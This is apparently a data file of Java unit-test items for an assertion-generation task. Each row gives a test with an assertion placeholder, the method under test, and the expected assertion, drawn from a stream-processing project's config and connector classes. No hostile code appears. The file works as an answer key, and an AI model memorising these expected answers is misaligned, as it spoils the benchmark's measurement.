"shouldGetInputData() { Row parentRow = Row.of(new Row(3), new Row(4)); RowManager rowManager = new RowManager(parentRow);  ""<AssertPlaceHolder>""; }
getInputData() { return getChildRow(INPUT_ROW_INDEX); }"	assertEquals(new Row(3), rowManager.getInputData())
"shouldGetOutputData() { Row parentRow = Row.of(new Row(3), new Row(4)); RowManager rowManager = new RowManager(parentRow);  ""<AssertPlaceHolder>""; }
getOutputData() { return getChildRow(OUTPUT_ROW_INDEX); }"	assertEquals(new Row(4), rowManager.getOutputData())
"shouldReturnStencilOrchestrator() { SchemaConfig schemaConfig = new SchemaConfig(configuration, stencilClientOrchestrator, columnNameManager); ""<AssertPlaceHolder>""; }
getStencilClientOrchestrator() { return stencilClientOrchestrator; }"	assertEquals(stencilClientOrchestrator, schemaConfig.getStencilClientOrchestrator())
"shouldReturnColumnNameManager() { SchemaConfig schemaConfig = new SchemaConfig(configuration, stencilClientOrchestrator, columnNameManager); Assert.""<AssertPlaceHolder>""; }
getColumnNameManager() { return columnNameManager; }"	assertEquals(columnNameManager, schemaConfig.getColumnNameManager())
"shouldReturnInputProtoClasses() { SchemaConfig schemaConfig = new SchemaConfig(configuration, stencilClientOrchestrator, columnNameManager); ""<AssertPlaceHolder>""; }
getInputProtoClasses() { return inputProtoClasses; }"	"assertArrayEquals(new String[]{""InputProtoMessage""}, schemaConfig.getInputProtoClasses())"
"shouldReturnOutputProtoClassName() { SchemaConfig schemaConfig = new SchemaConfig(configuration, stencilClientOrchestrator, columnNameManager); ""<AssertPlaceHolder>""; }
getOutputProtoClassName() { return outputProtoClassName; }"	"assertEquals(""OutputProtoMessage"", schemaConfig.getOutputProtoClassName())"
"Exception { ProtoDeserializer protoDeserializer = new ProtoDeserializer(TestBookingLogMessage.class.getName(), 5, ""rowtime"", stencilClientOrchestrator); ConsumerRecord<byte[], byte[]> consumerRecord = new ConsumerRecord<>(""test-topic"", 0, 0, null, TestBookingLogMessage.newBuilder().build().toByteArray()); Row validRow = protoDeserializer.deserialize(consumerRecord); FilterDecorator filter = new ValidRecordsDecorator(""test"", getColumns(), configuration); ""<AssertPlaceHolder>""; }
filter(Row value) throws Exception { if (!(boolean) value.getField(validationIndex)) { Exception ex = new InvalidProtocolBufferException(""Bad Record Encountered for table `"" + this.tableName + ""`""); errorReporter.reportFatalException(ex); throw ex; } return true; }"	assertTrue(filter.filter(validRow))
"shouldBeTrueWhenExternalSourceExists() { ""<AssertPlaceHolder>""; }
canProcess(PostProcessorConfig postProcessorConfig) { return postProcessorConfig.hasExternalSource(); }"	assertTrue(externalPostProcessor.canProcess(defaultPostProcessorConfig))
"shouldBeFalseWhenExternalSourceDoesNotExist() { defaultPostProcessorConfig = new PostProcessorConfig(null, null, null);  ""<AssertPlaceHolder>""; }
canProcess(PostProcessorConfig postProcessorConfig) { return postProcessorConfig.hasExternalSource(); }"	assertFalse(externalPostProcessor.canProcess(defaultPostProcessorConfig))
"shouldGetHttpConfig() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(http, es, pg, grpc);  ""<AssertPlaceHolder>""; }
getHttpConfig() { return http == null ? new ArrayList<>() : http; }"	assertEquals(http, externalSourceConfig.getHttpConfig())
"shouldGetEsConfig() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(http, es, pg, grpc);  ""<AssertPlaceHolder>""; }
getEsConfig() { return es == null ? new ArrayList<>() : es; }"	assertEquals(es, externalSourceConfig.getEsConfig())
"shouldGetPgConfig() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(http, es, pg, grpc);  ""<AssertPlaceHolder>""; }
getPgConfig() { return pg == null ? new ArrayList<>() : pg; }"	assertEquals(pg, externalSourceConfig.getPgConfig())
"shouldGetGrpcConfig() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(http, es, pg, grpc);  ""<AssertPlaceHolder>""; }
getGrpcConfig() { return grpc == null ? new ArrayList<>() : grpc; }"	assertEquals(grpc, externalSourceConfig.getGrpcConfig())
"shouldBeEmptyWhenAllConfigsAreEmpty() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(null, null, null, null);  ""<AssertPlaceHolder>""; }
isEmpty() { return (http == null || http.isEmpty()) && (es == null || es.isEmpty()) && (pg == null || pg.isEmpty()) && (grpc == null || grpc.isEmpty()); }"	assertTrue(externalSourceConfig.isEmpty())
"shouldNotBeEmptyWhenEsConfigIsPresent() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(null, es, null, null);  ""<AssertPlaceHolder>""; }
isEmpty() { return (http == null || http.isEmpty()) && (es == null || es.isEmpty()) && (pg == null || pg.isEmpty()) && (grpc == null || grpc.isEmpty()); }"	assertFalse(externalSourceConfig.isEmpty())
"shouldNotBeEmptyWhenHttpConfigIsPresent() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(http, null, null, null);  ""<AssertPlaceHolder>""; }
isEmpty() { return (http == null || http.isEmpty()) && (es == null || es.isEmpty()) && (pg == null || pg.isEmpty()) && (grpc == null || grpc.isEmpty()); }"	assertFalse(externalSourceConfig.isEmpty())
"shouldNotBeEmptyWhenPgConfigIsPresent() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(null, null, pg, null);  ""<AssertPlaceHolder>""; }
isEmpty() { return (http == null || http.isEmpty()) && (es == null || es.isEmpty()) && (pg == null || pg.isEmpty()) && (grpc == null || grpc.isEmpty()); }"	assertFalse(externalSourceConfig.isEmpty())
"shouldNotBeEmptyWhenGrpcConfigIsPresent() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(null, null, null, grpc);  ""<AssertPlaceHolder>""; }
isEmpty() { return (http == null || http.isEmpty()) && (es == null || es.isEmpty()) && (pg == null || pg.isEmpty()) && (grpc == null || grpc.isEmpty()); }"	assertFalse(externalSourceConfig.isEmpty())
"shouldNotBeEmptyWhenHttpAndEsConfigIsPresent() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(http, es, null, null);  ""<AssertPlaceHolder>""; }
isEmpty() { return (http == null || http.isEmpty()) && (es == null || es.isEmpty()) && (pg == null || pg.isEmpty()) && (grpc == null || grpc.isEmpty()); }"	assertFalse(externalSourceConfig.isEmpty())
"shouldNotBeEmptyWhenHttpAndPgConfigIsPresent() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(http, null, pg, null);  ""<AssertPlaceHolder>""; }
isEmpty() { return (http == null || http.isEmpty()) && (es == null || es.isEmpty()) && (pg == null || pg.isEmpty()) && (grpc == null || grpc.isEmpty()); }"	assertFalse(externalSourceConfig.isEmpty())
"shouldNotBeEmptyWhenEsAndPgConfigIsPresent() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(null, es, pg, null);  ""<AssertPlaceHolder>""; }
isEmpty() { return (http == null || http.isEmpty()) && (es == null || es.isEmpty()) && (pg == null || pg.isEmpty()) && (grpc == null || grpc.isEmpty()); }"	assertFalse(externalSourceConfig.isEmpty())
"shouldNotBeEmptyWhenEsAndGrpcConfigIsPresent() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(null, es, null, grpc);  ""<AssertPlaceHolder>""; }
isEmpty() { return (http == null || http.isEmpty()) && (es == null || es.isEmpty()) && (pg == null || pg.isEmpty()) && (grpc == null || grpc.isEmpty()); }"	assertFalse(externalSourceConfig.isEmpty())
"shouldNotBeEmptyWhenGrpcAndPgConfigIsPresent() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(null, null, pg, grpc);  ""<AssertPlaceHolder>""; }
isEmpty() { return (http == null || http.isEmpty()) && (es == null || es.isEmpty()) && (pg == null || pg.isEmpty()) && (grpc == null || grpc.isEmpty()); }"	assertFalse(externalSourceConfig.isEmpty())
"shouldNotBeEmptyWhenGrpcAndHttpConfigIsPresent() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(http, null, null, grpc);  ""<AssertPlaceHolder>""; }
isEmpty() { return (http == null || http.isEmpty()) && (es == null || es.isEmpty()) && (pg == null || pg.isEmpty()) && (grpc == null || grpc.isEmpty()); }"	assertFalse(externalSourceConfig.isEmpty())
"shouldNotBeEmptyWhenAllConfigsArePresent() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(http, es, pg, grpc);  ""<AssertPlaceHolder>""; }
isEmpty() { return (http == null || http.isEmpty()) && (es == null || es.isEmpty()) && (pg == null || pg.isEmpty()) && (grpc == null || grpc.isEmpty()); }"	assertFalse(externalSourceConfig.isEmpty())
"shouldGetOutputColumnNamesFromAllExternalSources() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(http, es, pg, grpc);  List<String> columnNames = Arrays.asList(""http_field_1"", ""http_field_2"", ""es_field_1"", ""pg_field_1"", ""grpc_field_1"");  ""<AssertPlaceHolder>"";  }
getOutputColumnNames() { ArrayList<String> columnNames = new ArrayList<>(); columnNames.addAll(getOutputColumnNames(http)); columnNames.addAll(getOutputColumnNames(es)); columnNames.addAll(getOutputColumnNames(pg)); columnNames.addAll(getOutputColumnNames(grpc)); return columnNames; }"	assertEquals(columnNames, externalSourceConfig.getOutputColumnNames())
"shouldGetOutputColumnNamesFromEsAndHttp() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(http, es, null, null);  List<String> columnNames = Arrays.asList(""http_field_1"", ""http_field_2"", ""es_field_1"");  ""<AssertPlaceHolder>"";  }
getOutputColumnNames() { ArrayList<String> columnNames = new ArrayList<>(); columnNames.addAll(getOutputColumnNames(http)); columnNames.addAll(getOutputColumnNames(es)); columnNames.addAll(getOutputColumnNames(pg)); columnNames.addAll(getOutputColumnNames(grpc)); return columnNames; }"	assertEquals(columnNames, externalSourceConfig.getOutputColumnNames())
"shouldGetOutputColumnNamesFromPgAndHttp() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(http, null, pg, null);  List<String> columnNames = Arrays.asList(""http_field_1"", ""http_field_2"", ""pg_field_1"");  ""<AssertPlaceHolder>"";  }
getOutputColumnNames() { ArrayList<String> columnNames = new ArrayList<>(); columnNames.addAll(getOutputColumnNames(http)); columnNames.addAll(getOutputColumnNames(es)); columnNames.addAll(getOutputColumnNames(pg)); columnNames.addAll(getOutputColumnNames(grpc)); return columnNames; }"	assertEquals(columnNames, externalSourceConfig.getOutputColumnNames())
"shouldGetOutputColumnNamesFromPgAndEs() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(null, es, pg, null);  List<String> columnNames = Arrays.asList(""es_field_1"", ""pg_field_1"");  ""<AssertPlaceHolder>"";  }
getOutputColumnNames() { ArrayList<String> columnNames = new ArrayList<>(); columnNames.addAll(getOutputColumnNames(http)); columnNames.addAll(getOutputColumnNames(es)); columnNames.addAll(getOutputColumnNames(pg)); columnNames.addAll(getOutputColumnNames(grpc)); return columnNames; }"	assertEquals(columnNames, externalSourceConfig.getOutputColumnNames())
"shouldGetOutputColumnNamesFromEsWhenOthersAreNotPresent() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(null, es, null, null);  List<String> columnNames = Collections.singletonList(""es_field_1"");  ""<AssertPlaceHolder>"";  }
getOutputColumnNames() { ArrayList<String> columnNames = new ArrayList<>(); columnNames.addAll(getOutputColumnNames(http)); columnNames.addAll(getOutputColumnNames(es)); columnNames.addAll(getOutputColumnNames(pg)); columnNames.addAll(getOutputColumnNames(grpc)); return columnNames; }"	assertEquals(columnNames, externalSourceConfig.getOutputColumnNames())
"shouldGetOutputColumnNamesFromHttpWhenOthersAreNotPresent() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(http, null, null, null);  List<String> columnNames = Arrays.asList(""http_field_1"", ""http_field_2"");  ""<AssertPlaceHolder>""; }
getOutputColumnNames() { ArrayList<String> columnNames = new ArrayList<>(); columnNames.addAll(getOutputColumnNames(http)); columnNames.addAll(getOutputColumnNames(es)); columnNames.addAll(getOutputColumnNames(pg)); columnNames.addAll(getOutputColumnNames(grpc)); return columnNames; }"	assertEquals(columnNames, externalSourceConfig.getOutputColumnNames())
"shouldGetOutputColumnNamesFromPgWhenOthersAreNotPresent() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(null, null, pg, null);  List<String> columnNames = Collections.singletonList(""pg_field_1"");  ""<AssertPlaceHolder>""; }
getOutputColumnNames() { ArrayList<String> columnNames = new ArrayList<>(); columnNames.addAll(getOutputColumnNames(http)); columnNames.addAll(getOutputColumnNames(es)); columnNames.addAll(getOutputColumnNames(pg)); columnNames.addAll(getOutputColumnNames(grpc)); return columnNames; }"	assertEquals(columnNames, externalSourceConfig.getOutputColumnNames())
"shouldGetOutputColumnNamesFromGrpcWhenOthersAreNotPresent() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(null, null, null, grpc);  List<String> columnNames = Collections.singletonList(""grpc_field_1"");  ""<AssertPlaceHolder>""; }
getOutputColumnNames() { ArrayList<String> columnNames = new ArrayList<>(); columnNames.addAll(getOutputColumnNames(http)); columnNames.addAll(getOutputColumnNames(es)); columnNames.addAll(getOutputColumnNames(pg)); columnNames.addAll(getOutputColumnNames(grpc)); return columnNames; }"	assertEquals(columnNames, externalSourceConfig.getOutputColumnNames())
"shouldGetEmptyOutputColumnNamesWhenNonePresent() { ExternalSourceConfig externalSourceConfig = new ExternalSourceConfig(null, null, null, null);  ""<AssertPlaceHolder>""; }
getOutputColumnNames() { ArrayList<String> columnNames = new ArrayList<>(); columnNames.addAll(getOutputColumnNames(http)); columnNames.addAll(getOutputColumnNames(es)); columnNames.addAll(getOutputColumnNames(pg)); columnNames.addAll(getOutputColumnNames(grpc)); return columnNames; }"	assertEquals(Collections.emptyList(), externalSourceConfig.getOutputColumnNames())
"getHostShouldGetRightConfig() { EsSourceConfig esSourceConfig = new EsSourceConfigBuilder() .setHost(host) .createEsSourceConfig(); ""<AssertPlaceHolder>""; }
getHost() { return host; }"	assertEquals(host, esSourceConfig.getHost())
"getPortShouldGetRightConfig() { EsSourceConfig esSourceConfig = new EsSourceConfigBuilder() .setPort(port) .createEsSourceConfig(); ""<AssertPlaceHolder>""; }
getPort() { return Integer.valueOf(port); }"	assertEquals(Integer.valueOf(port), esSourceConfig.getPort())
"getUserShouldGetRightConfig() { EsSourceConfig esSourceConfig = new EsSourceConfigBuilder() .setUser(user). createEsSourceConfig(); ""<AssertPlaceHolder>""; }
getUser() { return user == null ? """" : user; }"	assertEquals(user, esSourceConfig.getUser())
"getPasswordShouldGetRightConfig() { EsSourceConfig esSourceConfig = new EsSourceConfigBuilder() .setPassword(password) .createEsSourceConfig(); ""<AssertPlaceHolder>""; }
getPassword() { return password == null ? """" : password; }"	assertEquals(password, esSourceConfig.getPassword())
"getUserWhenUserIsNullShouldReturnEmptyString() { EsSourceConfig esSourceConfig = new EsSourceConfigBuilder() .setUser(null) .createEsSourceConfig(); ""<AssertPlaceHolder>""; }
getUser() { return user == null ? """" : user; }"	"assertEquals("""", esSourceConfig.getUser())"
"getPasswordWhenPasswordIsNullShouldReturnEmptyString() { EsSourceConfig esSourceConfig = new EsSourceConfigBuilder() .setPassword(null) .createEsSourceConfig(); ""<AssertPlaceHolder>""; }
getPassword() { return password == null ? """" : password; }"	"assertEquals("""", esSourceConfig.getPassword())"
"getEndpointPatternShouldGetRightConfig() { EsSourceConfig esSourceConfig = new EsSourceConfigBuilder() .setEndpointPattern(endpointPattern) .createEsSourceConfig(); ""<AssertPlaceHolder>""; }
getPattern() { return endpointPattern; }"	assertEquals(endpointPattern, esSourceConfig.getPattern())
"getEndpointVariablesShouldGetRightConfig() { EsSourceConfig esSourceConfig = getValidEsSourceConfigBuilder() .setEndpointVariables(endpointVariables) .createEsSourceConfig(); ""<AssertPlaceHolder>""; }
getVariables() { return endpointVariables; }"	assertEquals(endpointVariables, esSourceConfig.getVariables())
"getMetricIdShouldGetRightConfig() { EsSourceConfig esSourceConfig = new EsSourceConfigBuilder() .setMetricId(metricId) .createEsSourceConfig(); ""<AssertPlaceHolder>""; }
getMetricId() { return metricId; }"	assertEquals(metricId, esSourceConfig.getMetricId())
"isRetainResponseTypeShouldGetTheRightConfig() { EsSourceConfig esSourceConfig = new EsSourceConfigBuilder() .setRetainResponseType(retainResponseType) .createEsSourceConfig(); ""<AssertPlaceHolder>""; }
isRetainResponseType() { return retainResponseType; }"	assertEquals(retainResponseType, esSourceConfig.isRetainResponseType())
"isFailOnErrorsShouldGetRightConfig() { EsSourceConfig esSourceConfig = new EsSourceConfigBuilder() .setFailOnErrors(failOnErrors) .createEsSourceConfig(); ""<AssertPlaceHolder>""; }
isFailOnErrors() { return failOnErrors; }"	assertEquals(failOnErrors, esSourceConfig.isFailOnErrors())
"getTypeShouldGetRightConfig() { EsSourceConfig esSourceConfig = new EsSourceConfigBuilder() .setType(type) .createEsSourceConfig(); ""<AssertPlaceHolder>""; }
getType() { return type; }"	assertEquals(type, esSourceConfig.getType())
"hasTypeShouldBeTrueWhenTypeIsPresent() { EsSourceConfig esSourceConfig = new EsSourceConfigBuilder() .setType(type) .createEsSourceConfig(); ""<AssertPlaceHolder>""; }
hasType() { return StringUtils.isNotEmpty(type); }"	assertTrue(esSourceConfig.hasType())
"hasTypeShouldBeFalseWhenTypeIsNull() { EsSourceConfig esSourceConfig = new EsSourceConfigBuilder() .setType(null) .createEsSourceConfig(); ""<AssertPlaceHolder>""; }
hasType() { return StringUtils.isNotEmpty(type); }"	assertFalse(esSourceConfig.hasType())
"hasTypeShouldBeFalseWhenTypeIsEmpty() { EsSourceConfig esSourceConfig = new EsSourceConfigBuilder() .setType("""") .createEsSourceConfig(); ""<AssertPlaceHolder>""; }
hasType() { return StringUtils.isNotEmpty(type); }"	assertFalse(esSourceConfig.hasType())
"getCapacityShouldGetRightConfig() { EsSourceConfig esSourceConfig = new EsSourceConfigBuilder() .setCapacity(capacity) .createEsSourceConfig(); ""<AssertPlaceHolder>""; }
getCapacity() { return Integer.valueOf(capacity); }"	assertEquals(Integer.valueOf(capacity), esSourceConfig.getCapacity())
"getRetryTimeoutShouldGetRightConfig() { EsSourceConfig esSourceConfig = new EsSourceConfigBuilder() .setRetryTimeout(retryTimeout) .createEsSourceConfig(); ""<AssertPlaceHolder>""; }
getRetryTimeout() { return Integer.valueOf(retryTimeout); }"	assertEquals(Integer.valueOf(retryTimeout), esSourceConfig.getRetryTimeout())
"getSocketTimeoutShouldGetRightConfig() { EsSourceConfig esSourceConfig = new EsSourceConfigBuilder() .setSocketTimeout(socketTimeout) .createEsSourceConfig(); ""<AssertPlaceHolder>""; }
getSocketTimeout() { return Integer.valueOf(socketTimeout); }"	assertEquals(Integer.valueOf(socketTimeout), esSourceConfig.getSocketTimeout())
"getStreamTimeoutShouldGetRightConfig() { EsSourceConfig esSourceConfig = new EsSourceConfigBuilder() .setStreamTimeout(streamTimeout) .createEsSourceConfig(); ""<AssertPlaceHolder>""; }
getStreamTimeout() { return Integer.valueOf(streamTimeout); }"	assertEquals(Integer.valueOf(streamTimeout), esSourceConfig.getStreamTimeout())
"getConnectTimeoutShouldGetRightConfig() { EsSourceConfig esSourceConfig = new EsSourceConfigBuilder() .setConnectTimeout(connectTimeout) .createEsSourceConfig(); ""<AssertPlaceHolder>""; }
getConnectTimeout() { return Integer.valueOf(connectTimeout); }"	assertEquals(Integer.valueOf(connectTimeout), esSourceConfig.getConnectTimeout())
"getOutputColumnNames() { HashMap<String, OutputMapping> outputMap = new HashMap<String, OutputMapping>(); outputMap.put(""key"", new OutputMapping(""path"")); EsSourceConfig esSourceConfig = new EsSourceConfigBuilder() .setOutputMapping(outputMap) .createEsSourceConfig(); ""<AssertPlaceHolder>""; }
getOutputColumns() { return new ArrayList<>(outputMapping.keySet()); }"	"assertEquals(Arrays.asList(""key""), esSourceConfig.getOutputColumns())"
"shouldReturnMandatoryFields() { HashMap<String, Object> expectedMandatoryFields = new HashMap<>(); expectedMandatoryFields.put(""host"", host); expectedMandatoryFields.put(""port"", port); expectedMandatoryFields.put(""endpoint_pattern"", endpointPattern); expectedMandatoryFields.put(""capacity"", capacity); expectedMandatoryFields.put(""connect_timeout"", connectTimeout); expectedMandatoryFields.put(""retry_timeout"", retryTimeout); expectedMandatoryFields.put(""socket_timeout"", socketTimeout); expectedMandatoryFields.put(""stream_timeout"", streamTimeout); expectedMandatoryFields.put(""fail_on_errors"", failOnErrors); expectedMandatoryFields.put(""outputMapping"", outputMappingHashMap); EsSourceConfig esSourceConfig = getValidEsSourceConfigBuilder().createEsSourceConfig(); HashMap<String, Object> actualMandatoryFields = esSourceConfig.getMandatoryFields(); ""<AssertPlaceHolder>""; }
getMandatoryFields() { HashMap<String, Object> mandatoryFields = new HashMap<>(); mandatoryFields.put(""host"", host); mandatoryFields.put(""port"", port); mandatoryFields.put(""endpoint_pattern"", endpointPattern); mandatoryFields.put(""capacity"", capacity); mandatoryFields.put(""connect_timeout"", connectTimeout); mandatoryFields.put(""retry_timeout"", retryTimeout); mandatoryFields.put(""socket_timeout"", socketTimeout); mandatoryFields.put(""stream_timeout"", streamTimeout); mandatoryFields.put(""fail_on_errors"", failOnErrors); mandatoryFields.put(""outputMapping"", outputMapping);  return mandatoryFields; }"	assertEquals(expectedMandatoryFields, actualMandatoryFields)
"canDecorateStreamWhenConfigIsPresent() { EsStreamDecorator esStreamDecorator = new EsStreamDecorator(esSourceConfig, externalMetricConfig, schemaConfig); ""<AssertPlaceHolder>""; }
canDecorate() { return esSourceConfig != null; }"	assertTrue(esStreamDecorator.canDecorate())
"cannotDecorateStreamWhenConfigIsNull() { EsStreamDecorator esStreamDecorator = new EsStreamDecorator(null, externalMetricConfig, schemaConfig);  ""<AssertPlaceHolder>""; }
canDecorate() { return esSourceConfig != null; }"	assertFalse(esStreamDecorator.canDecorate())
"Exception {  GrpcAsyncConnector grpcAsyncConnector = new GrpcAsyncConnector(grpcSourceConfig, externalMetricConfig, schemaConfig, grpcClient, errorReporter, meterStatsManager, descriptorManager);  grpcAsyncConnector.close();  verify(grpcClient, times(1)).close(); verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.CLOSE_CONNECTION_ON_EXTERNAL_CLIENT); ""<AssertPlaceHolder>""; }
getGrpcClient() { return grpcClient; }"	assertNull(grpcAsyncConnector.getGrpcClient())
"shouldReturnGrpcClient() { GrpcAsyncConnector grpcAsyncConnector = new GrpcAsyncConnector(grpcSourceConfig, externalMetricConfig, schemaConfig, grpcClient, errorReporter, meterStatsManager, descriptorManager); GrpcClient returnedGrpcClient = grpcAsyncConnector.getGrpcClient(); ""<AssertPlaceHolder>""; }
getGrpcClient() { return grpcClient; }"	assertEquals(grpcClient, returnedGrpcClient)
"InvalidProtocolBufferException { outputMapping.put(""success"", new OutputMapping(""$.success"")); grpcSourceConfig = new GrpcSourceConfigBuilder().setEndpoint(""localhost"").setServicePort(8000).setGrpcRequestProtoSchema(""org.raystack.dagger.consumer.TestGrpcRequest"").setGrpcResponseProtoSchema(""org.raystack.dagger.consumer.TestGrpcResponse"").setGrpcMethodUrl(""org.raystack.dagger.consumer.test/TestMethod"").setRequestPattern(""{""key"": ""%s""}"").setRequestVariables(""customer_id"").setOutputMapping(outputMapping).createGrpcSourceConfig();  GrpcResponseHandler grpcResponseHandler = new GrpcResponseHandler(grpcSourceConfig, meterStatsManager, rowManager, columnNameManager, descriptor, resultFuture, errorReporter, new PostResponseTelemetry());  Row resultStreamData = new Row(2); Row outputData = new Row(2); outputData.setField(0, null); resultStreamData.setField(0, inputData); resultStreamData.setField(1, outputData);  grpcResponseHandler.startTimer(); grpcResponseHandler.onError(new Throwable(""io.grpc.StatusRuntimeException: UNKNOWN""));   verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.OTHER_ERRORS); ArgumentCaptor<GrpcFailureException> exceptionCaptor = ArgumentCaptor.forClass(GrpcFailureException.class); verify(errorReporter, times(1)).reportNonFatalException(exceptionCaptor.capture()); ""<AssertPlaceHolder>""; verify(resultFuture, times(1)).complete(Collections.singleton(resultStreamData)); }
onError(Throwable t) { t.printStackTrace(); meterStatsManager.markEvent(ExternalSourceAspects.OTHER_ERRORS); failureHandler(t.getMessage());  }"	"assertEquals(""io.grpc.StatusRuntimeException: UNKNOWN"", exceptionCaptor.getValue().getMessage())"
"shouldReturnConnectTimeout() { ""<AssertPlaceHolder>""; }
getConnectTimeout() { return Integer.parseInt(connectTimeout); }"	assertEquals(Integer.parseInt(connectTimeout), (int) grpcSourceConfig.getConnectTimeout())
"shouldReturnEndpoint() { ""<AssertPlaceHolder>""; }
getEndpoint() { return endpoint; }"	assertEquals(endpoint, grpcSourceConfig.getEndpoint())
"shouldReturnStreamTimeout() { ""<AssertPlaceHolder>""; }
getStreamTimeout() { return Integer.valueOf(streamTimeout); }"	assertEquals(Integer.valueOf(streamTimeout), grpcSourceConfig.getStreamTimeout())
"shouldReturnBodyPattern() { ""<AssertPlaceHolder>""; }
getPattern() { return requestPattern; }"	assertEquals(requestPattern, grpcSourceConfig.getPattern())
"shouldReturnBodyVariable() { ""<AssertPlaceHolder>""; }
getVariables() { return requestVariables; }"	assertEquals(requestVariables, grpcSourceConfig.getVariables())
"isRetainResponseTypeShouldGetTheRightConfig() { ""<AssertPlaceHolder>""; }
isRetainResponseType() { return retainResponseType; }"	assertEquals(retainResponseType, grpcSourceConfig.isRetainResponseType())
"shouldReturnFailOnErrors() { ""<AssertPlaceHolder>""; }
isFailOnErrors() { return failOnErrors; }"	assertEquals(failOnErrors, grpcSourceConfig.isFailOnErrors())
"shouldReturnVerb() { ""<AssertPlaceHolder>""; }
getGrpcMethodUrl() { return grpcMethodUrl; }"	assertEquals(grpcMethodUrl, grpcSourceConfig.getGrpcMethodUrl())
"getMetricIdShouldGetRightConfig() { ""<AssertPlaceHolder>""; }
getMetricId() { return metricId; }"	assertEquals(metricId, grpcSourceConfig.getMetricId())
"shouldReturnType() { ""<AssertPlaceHolder>""; }
getType() { return type; }"	assertEquals(type, grpcSourceConfig.getType())
"hasTypeShouldBeTrueWhenTypeIsPresent() { ""<AssertPlaceHolder>""; }
hasType() { return StringUtils.isNotEmpty(type); }"	assertTrue(grpcSourceConfig.hasType())
"hasTypeShouldBeFalseWhenTypeIsNull() { HttpSourceConfig httpSourceConfig = new HttpSourceConfig("""", """", """", """", """", """", """", null, """", false, null, """", new HashMap<>(), new HashMap<>(), metricId, false); ""<AssertPlaceHolder>""; }
hasType() { return StringUtils.isNotEmpty(type); }"	assertFalse(httpSourceConfig.hasType())
"hasTypeShouldBeFalseWhenTypeIsEmpty() { HttpSourceConfig httpSourceConfig = new HttpSourceConfig("""", """",  """", """", """", """", """", """", """", false, """", """", new HashMap<>(), new HashMap<>(), metricId, false); ""<AssertPlaceHolder>""; }
hasType() { return StringUtils.isNotEmpty(type); }"	assertFalse(httpSourceConfig.hasType())
"shouldReturnHeaderMap() { ""<AssertPlaceHolder>""; }
getHeaders() { return headers; }"	assertEquals(headerMap, grpcSourceConfig.getHeaders())
"shouldReturnOutputMapping() { ""<AssertPlaceHolder>""; }
getOutputMapping() { return outputMapping; }"	assertEquals(outputMappings, grpcSourceConfig.getOutputMapping())
"shouldReturnCapacity() { ""<AssertPlaceHolder>""; }
getCapacity() { return capacity; }"	assertEquals(capacity, grpcSourceConfig.getCapacity())
"shouldReturnColumnNames() { List<String> actualColumns = grpcSourceConfig.getOutputColumns(); String[] expectedColumns = {""surge_factor""}; ""<AssertPlaceHolder>""; }
getOutputColumns() { return new ArrayList<>(outputMapping.keySet()); }"	assertArrayEquals(expectedColumns, actualColumns.toArray())
"canDecorateGrpcAsync() { GrpcStreamDecorator grpcStreamDecorator = new GrpcStreamDecorator(grpcSourceConfig, externalMetricConfig, schemaConfig); ""<AssertPlaceHolder>""; }
canDecorate() { return grpcSourceConfig != null; }"	assertTrue(grpcStreamDecorator.canDecorate())
"shouldNotDecorateOtherThanGrpcAsync() { GrpcStreamDecorator grpcStreamDecorator = new GrpcStreamDecorator(null, externalMetricConfig, schemaConfig); ""<AssertPlaceHolder>""; }
canDecorate() { return grpcSourceConfig != null; }"	assertFalse(grpcStreamDecorator.canDecorate())
"IOException { DynamicMessageMarshaller dynamicMessageMarshaller = new DynamicMessageMarshaller(TestGrpcRequest.getDescriptor());  TestGrpcRequest request = TestGrpcRequest.newBuilder().setField1(""yes"").build();  DynamicMessage message = DynamicMessage.parseFrom(TestGrpcRequest.getDescriptor(), request.toByteArray());  InputStream stream = dynamicMessageMarshaller.stream(message);  ""<AssertPlaceHolder>"";  }
stream(DynamicMessage abstractMessage) { return abstractMessage.toByteString().newInput(); }"	assertTrue(IOUtils.contentEquals(stream, message.toByteString().newInput()))
"channelShouldBeAddedForAHostAndPort() {  grpcSourceConfig = mock(GrpcSourceConfig.class);  GrpcClient grpcClient = new GrpcClient(grpcSourceConfig);  when(grpcSourceConfig.getEndpoint()).thenReturn(""localhost""); when(grpcSourceConfig.getServicePort()).thenReturn(8080);  grpcClient.addChannel();  Channel decoratedChannel = grpcClient.getDecoratedChannel(); ""<AssertPlaceHolder>"";  }
getDecoratedChannel() { return decoratedChannel; }"	assertNotNull(decoratedChannel)
"Exception {  HttpAsyncConnector httpAsyncConnector = new HttpAsyncConnector(defaultHttpSourceConfig, externalMetricConfig, schemaConfig, httpClient, errorReporter, meterStatsManager, defaultDescriptorManager);  httpAsyncConnector.close();  verify(httpClient, times(1)).close(); verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.CLOSE_CONNECTION_ON_EXTERNAL_CLIENT); ""<AssertPlaceHolder>""; }
getHttpClient() { return httpClient; }"	assertNull(httpAsyncConnector.getHttpClient())
